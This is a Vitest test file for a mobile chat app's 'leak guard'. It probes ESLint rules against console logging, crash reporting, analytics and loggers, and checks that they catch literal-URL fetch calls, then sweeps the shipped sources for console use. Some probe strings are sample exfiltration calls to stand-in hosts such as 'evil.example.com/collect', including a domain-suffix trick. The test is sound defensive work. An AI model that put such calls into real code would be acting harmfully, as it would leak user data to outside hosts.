// Leak guard (docs/mobile/test-plan.md §1.6, task Q4). Two halves:
//
// 1. The lint rules in packages/core/eslint.config.mjs and apps/mobile/eslint.config.mjs are
//    probed with ESLint's own API: one temp file per forbidden pattern is written to the
//    scratchpad, read back and linted under a virtual path inside the package (flat config
//    matches `files` globs relative to the config, so a file physically outside the package
//    would be "outside of base path"; the content is what is under test). Every probe must be
//    reported, a clean file must pass, and the two configs must agree.
// 2. A grep-style sweep over the shipped sources: no `console.` and no `__DEV__ && console`
//    outside tests. The ESLint rule already forbids both; the sweep catches a file the lint does
//    not reach (an ignored path, a new extension) and runs in well under a second.
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { ESLint, type Linter } from 'eslint';
import { mkdirSync, writeFileSync, readFileSync, rmSync, existsSync, readdirSync, statSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const HERE = path.dirname(new URL(import.meta.url).pathname);
const CORE = path.resolve(HERE, '..');
const REPO = path.resolve(CORE, '..', '..');
const MOBILE = path.join(REPO, 'apps', 'mobile');

// The session scratchpad when this runs on the lead's Mac; the OS temp dir anywhere else (CI).
const SCRATCHPAD = '/private/tmp/claude-501/-Users-pulkitverma/013a1f47-7592-418d-bc12-4930da773840/scratchpad';
const TMP = path.join(existsSync(SCRATCHPAD) ? SCRATCHPAD : os.tmpdir(), 'leak-guard');

type Probe = {
  name: string;
  code: string;
  /** A fragment of every message that must be reported (one entry per expected report). */
  expect: string[];
  /** Virtual location, relative to the package root; decides which config blocks apply. */
  at?: { core: string; mobile: string };
};

const RN = { core: 'src/adapters/rn/__probe__/p.ts', mobile: 'app/__probe__/p.tsx' };
const CHAT = { core: 'src/chat/__probe__/p.ts', mobile: 'lib/__probe__/p.ts' };

const probes: Probe[] = [
  { name: 'console', code: `export function f(body: string) { console.log(body); }`, expect: ['Unexpected console statement'] },
  { name: 'console-dev', code: `declare const __DEV__: boolean; export function f(body: string) { if (__DEV__) console.warn(body); }`, expect: ['Unexpected console statement'] },
  { name: 'sentry-member', code: `declare const Sentry: any; export function f(body: string) { Sentry.captureMessage(body); }`, expect: ['No crash reporting'] },
  { name: 'sentry-nested', code: `declare const Sentry: any; export function f(e: Error) { Sentry.Native.captureException(e); }`, expect: ['No crash reporting'] },
  { name: 'crashlytics-factory', code: `declare const crashlytics: any; export function f(token: string) { crashlytics().log(token); }`, expect: ['No crash reporting', 'No crash reporting'] },
  { name: 'analytics-track', code: `declare const analytics: any; export function f(nick: string) { analytics.track('joined', { nick }); }`, expect: ['No crash reporting'] },
  { name: 'posthog-capture', code: `declare const posthog: any; export function f() { posthog.capture('open'); }`, expect: ['No crash reporting'] },
  { name: 'telemetry-import', code: `import * as Sentry from '@sentry/react-native';\nexport const x = Sentry;`, expect: ['No crash reporting'] },
  { name: 'telemetry-import-firebase', code: `import crashlytics from '@react-native-firebase/crashlytics';\nexport const x = crashlytics;`, expect: ['No crash reporting'] },
  { name: 'telemetry-require', code: `declare const require: any; export const s = require('@sentry/react-native');`, expect: ['No crash reporting'] },
  { name: 'logger-member', code: `declare const logger: any; export function f(body: string) { logger.info(body); }`, expect: ['Ad-hoc logger'] },
  { name: 'log-member', code: `declare const log: any; export function f(key: string) { log.warn(key); }`, expect: ['Ad-hoc logger'] },
  { name: 'stringify-ident-to-sink', code: `declare const analytics: any; export function f(nick: string) { analytics.track(JSON.stringify(nick)); }`, expect: ['No crash reporting', 'JSON.stringify of a sensitive value'] },
  { name: 'stringify-member-to-console', code: `export function f(msg: { body: string }) { console.log(JSON.stringify(msg.body)); }`, expect: ['Unexpected console statement', 'JSON.stringify of a sensitive value'] },
  { name: 'stringify-to-log-fn', code: `declare function log(s: string): void; export function f(message: string) { log(JSON.stringify(message)); }`, expect: ['JSON.stringify of a sensitive value'] },
  { name: 'stringify-member-to-log-fn', code: `declare function log(s: string): void; export function f(m: { token: string }) { log(JSON.stringify(m.token)); }`, expect: ['JSON.stringify of a sensitive value'] },
  { name: 'stringify-to-factory-sink', code: `declare const crashlytics: any; export function f(secret: string) { crashlytics().log(JSON.stringify(secret)); }`, expect: ['No crash reporting', 'No crash reporting', 'JSON.stringify of a sensitive value'] },
  { name: 'fetch-foreign-host', code: `export async function f() { await fetch('https://evil.example.com/collect'); }`, expect: ['fetch() with a literal URL'], at: RN },
  { name: 'fetch-suffix-trick', code: `export async function f() { await fetch('https://onepeek.io.evil.example/x'); }`, expect: ['fetch() with a literal URL'], at: RN },
  { name: 'fetch-plain-http', code: `export async function f() { await fetch('http://onepeek.io/api/chat/notify'); }`, expect: ['fetch() with a literal URL'], at: RN },
  { name: 'fetch-relative', code: `export async function f() { await fetch('/api/chat/notify'); }`, expect: ['fetch() with a literal URL'], at: RN },
  { name: 'fetch-template', code: 'export async function f() { await fetch(`https://evil.example.com/collect`); }', expect: ['fetch() with a literal URL'], at: RN },
  { name: 'fetch-globalThis', code: `export async function f() { await globalThis.fetch('https://evil.example.com/collect'); }`, expect: ['fetch() with a literal URL'], at: RN },
];

// Everything a screen or adapter legitimately does. Must lint clean under both configs.
const CLEAN = `
import { log, redact } from '${path.join(CORE, 'src', 'log.ts').replace(/\\.ts$/, '')}';
export const trail: string[] = [];
export function record(roomId: string, body: string) {
  trail.push(roomId);
  log('message_sent', redact({ roomId, body, length: body.length }) as Record<string, unknown>);
}
export async function notify(apiBaseUrl: string) {
  await fetch(\`\${apiBaseUrl}/api/chat/notify\`, { method: 'POST' });
  await fetch('https://onepeek.io/api/chat/notify', { method: 'POST' });
  await fetch('https://abcdefgh.supabase.co/rest/v1/', { method: 'GET' });
  await globalThis.fetch('https://www.onepeek.io/');
}
export function serialise(roomId: string) {
  return JSON.stringify({ roomId });
}
`;

function fragmentsOf(messages: Linter.LintMessage[]): string[] {
  return messages.map(m => (m.fatal ? `FATAL ${m.message}` : m.message));
}

function assertReported(all: Linter.LintMessage[], wanted: string[], label: string) {
  // Warnings (the probes' `any` declarations) are noise; the guard is made of errors.
  const messages = all.filter(m => m.severity === 2 || m.fatal);
  const got = fragmentsOf(messages);
  expect(got.some(g => g.startsWith('FATAL')), `${label}: parse error ${got.join(' | ')}`).toBe(false);
  for (const fragment of wanted) {
    const idx = got.findIndex(g => g.includes(fragment));
    expect(idx, `${label}: expected a report containing "${fragment}", got: ${got.join(' | ') || '(nothing)'}`).toBeGreaterThanOrEqual(0);
    got.splice(idx, 1);
  }
  // Only leak-guard reports are expected; anything else (an unused var, a parse problem) is a
  // broken probe and would hide a missing rule. The one tolerated extra is the Expo config's
  // `import/no-unresolved` on a telemetry package: it is not installed, which is the point.
  const unexpected = got.filter(g => !/console statement|No crash reporting|Ad-hoc logger|JSON.stringify of a sensitive value|fetch\(\) with a literal URL|Unable to resolve path to module/.test(g));
  expect(unexpected, `${label}: unexpected reports`).toEqual([]);
}

let core: ESLint;
let mobile: ESLint;

beforeAll(() => {
  mkdirSync(TMP, { recursive: true });
  core = new ESLint({ cwd: CORE, overrideConfigFile: path.join(CORE, 'eslint.config.mjs') });
  mobile = new ESLint({ cwd: MOBILE, overrideConfigFile: path.join(MOBILE, 'eslint.config.mjs') });
});

afterAll(() => {
  rmSync(TMP, { recursive: true, force: true });
});

describe('leak guard: lint rules', () => {
  for (const p of probes) {
    const at = p.at ?? CHAT;
    it(`core config reports ${p.name}`, async () => {
      const file = path.join(TMP, `${p.name}.core.ts`);
      writeFileSync(file, p.code);
      const [r] = await core.lintText(readFileSync(file, 'utf8'), { filePath: path.join(CORE, at.core) });
      assertReported(r.messages, p.expect, `core/${p.name}`);
    });
    it(`mobile config reports ${p.name}`, async () => {
      const file = path.join(TMP, `${p.name}.mobile.tsx`);
      writeFileSync(file, p.code);
      const [r] = await mobile.lintText(readFileSync(file, 'utf8'), { filePath: path.join(MOBILE, at.mobile) });
      assertReported(r.messages, p.expect, `mobile/${p.name}`);
    });
  }

  it('a clean file passes both configs', async () => {
    const file = path.join(TMP, 'clean.ts');
    writeFileSync(file, CLEAN);
    const [c] = await core.lintText(readFileSync(file, 'utf8'), { filePath: path.join(CORE, RN.core) });
    expect(fragmentsOf(c.messages.filter(m => m.severity === 2)), 'core').toEqual([]);
    const [m] = await mobile.lintText(readFileSync(file, 'utf8'), { filePath: path.join(MOBILE, RN.mobile) });
    expect(fragmentsOf(m.messages.filter(m => m.severity === 2)), 'mobile').toEqual([]);
  });

  it('the fetch host rule is scoped: the web adapter may still post to a relative /api path', async () => {
    const code = `export async function f() { await fetch('/api/chat/notify', { method: 'POST' }); }`;
    const [r] = await core.lintText(code, { filePath: path.join(CORE, 'src/adapters/web/__probe__/p.ts') });
    expect(fragmentsOf(r.messages)).toEqual([]);
  });

  it('log.push and other non-logging members of a `log` variable are not mistaken for a logger', async () => {
    const code = `export const log: string[] = []; export function f(k: string) { log.push(k); return log.filter(Boolean).indexOf(k); }`;
    const [r] = await core.lintText(code, { filePath: path.join(CORE, CHAT.core) });
    expect(fragmentsOf(r.messages)).toEqual([]);
  });

  it('writes its probes under the scratchpad (or the OS temp dir) and nowhere in the repo', () => {
    expect(TMP.startsWith(REPO)).toBe(false);
    expect(readdirSync(TMP).length).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------- static sweep

const SKIP_DIRS = new Set(['node_modules', 'ios', 'android', '.expo', 'e2e', '__tests__', '.git', 'dist', 'build']);
const TEST_FILE = /\.test\.[jt]sx?$/;

function* walk(dir: string, exts: string[]): Generator<string> {
  if (!existsSync(dir)) return;
  for (const name of readdirSync(dir)) {
    const full = path.join(dir, name);
    const st = statSync(full, { throwIfNoEntry: false });
    if (!st) continue;
    if (st.isSymbolicLink()) continue;
    if (st.isDirectory()) {
      if (!SKIP_DIRS.has(name)) yield* walk(full, exts);
    } else if (exts.some(e => name.endsWith(e)) && !TEST_FILE.test(name)) {
      yield full;
    }
  }
}

function sweep(files: Iterable<string>, pattern: RegExp): string[] {
  const hits: string[] = [];
  for (const f of files) {
    const lines = readFileSync(f, 'utf8').split('\n');
    lines.forEach((line, i) => {
      if (pattern.test(line)) hits.push(`${path.relative(REPO, f)}:${i + 1}`);
    });
  }
  return hits;
}

describe('leak guard: static sweep of shipped sources', () => {
  const mobileFiles = () => walk(MOBILE, ['.ts', '.tsx']);
  const coreFiles = () => walk(path.join(CORE, 'src'), ['.ts']);

  it('sees the files it is meant to sweep', () => {
    const m = [...mobileFiles()];
    const c = [...coreFiles()];
    expect(m.some(f => f.endsWith(path.join('app', '_layout.tsx'))), 'apps/mobile/app/_layout.tsx').toBe(true);
    expect(c.some(f => f.endsWith(path.join('chat', 'client.ts'))), 'packages/core/src/chat/client.ts').toBe(true);
    expect(m.some(f => TEST_FILE.test(f))).toBe(false);
  });

  it('no `console.` in apps/mobile/**/*.{ts,tsx} or packages/core/src/**/*.ts outside tests', () => {
    expect(sweep([...mobileFiles(), ...coreFiles()], /console\./)).toEqual([]);
  });

  it('no `__DEV__ && console` either (a dev-only log still ships in the development build)', () => {
    expect(sweep([...mobileFiles(), ...coreFiles()], /__DEV__\s*&&\s*console/)).toEqual([]);
  });
});
